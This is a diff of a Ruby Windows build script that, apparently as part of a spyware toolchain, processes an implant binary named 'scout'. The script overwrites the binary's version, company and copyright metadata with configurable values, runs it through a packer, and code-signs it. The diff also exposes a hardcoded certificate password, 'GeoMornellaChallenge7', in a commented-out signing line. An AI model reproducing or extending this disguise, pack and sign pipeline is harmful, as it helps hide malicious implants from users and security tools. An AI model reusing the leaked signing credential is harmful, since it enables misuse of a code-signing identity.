@@ -117,7 +117,6 @@ class BuildWindows < Build
     # TODO: use them!!!
     #CrossPlatform.exec path('packer32'), "#{path('core')}"
     #CrossPlatform.exec path('packer64'), "#{path('core64')}"
-    CrossPlatform.exec path('packer32'), "#{path('scout')}"
   end
 
   def scramble
@@ -452,10 +451,12 @@ class BuildWindows < Build
     # change the infos
     CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
 
+    # pack the scout
+    CrossPlatform.exec path('packer32'), "#{path('scout')}"
+
     # sign it
-    # TODO: fix this
-    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("globalsign.cer")} #{path('scout')}" if to_be_signed?
-    CrossPlatform.exec path('signtool'), "sign /P GeoMornellaChallenge7 /f #{Config.instance.cert("HT.pfx")} #{path('scout')}" if to_be_signed?
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('scout')}" if to_be_signed?
+    #CrossPlatform.exec path('signtool'), "sign /P GeoMornellaChallenge7 /f #{Config.instance.cert("HT.pfx")} #{path('scout')}" if to_be_signed?
   end
 
   def customize_icon(file, icon)
